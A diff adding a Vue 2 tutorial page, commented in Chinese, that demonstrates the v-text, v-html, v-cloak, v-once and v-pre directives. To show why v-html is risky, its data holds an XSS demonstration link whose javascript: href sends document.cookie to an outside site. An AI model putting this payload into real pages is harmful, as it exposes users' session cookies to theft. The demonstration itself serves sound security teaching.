@@ -1,0 +1,40 @@
+<html>
+
+<head>
+    <title>内值指令</title>
+    <script src="../../resource/vue2.7.js"></script>
+</head>
+
+<body>
+    <div id="root">
+        <!-- v-text 往元素中插入文本，会替换掉元素的原本内容，使用v-text会把所有内容解析为字符串，不支持html/js代码标签解析 -->
+        <div v-text="name"></div>
+
+        <!-- v-html同上，但：v-html指令支持html/js代码标签解析 （有XSS攻击安全性问题，如用户输入js代码会被解析执行）-->
+        <div v-html="html"></div>
+
+        <!-- vue接管容器后会删除v-cloak属性，配合css隐藏带v-cloak元素，防止页面加载过慢时出现{{xx}}情况 -->
+        <div v-cloak="name"></div>
+
+        <!-- v-once修饰的属性初始化后就不会再被变化 -->
+        <h3 v-once>{{n}}</h3>
+        <h3>{{n}}</h3>
+        <button @click="n++">n+1</button>
+        <br><br>
+        <!-- v-pre 跳过vue编译 -->
+        <button v-pre a="1">v-pre跳过编译</button>
+
+    </div>
+</body>
+<script>
+    new Vue({
+        el: "#root",
+        data: {
+            name: '<h1>test<h1>',
+            html: '<a href=javascript:location.href="http://www.baidu.com"?+document.cookie>点击跳转(XSS攻击)</a>',
+            n:1
+        }
+    })
+</script>
+
+</html>
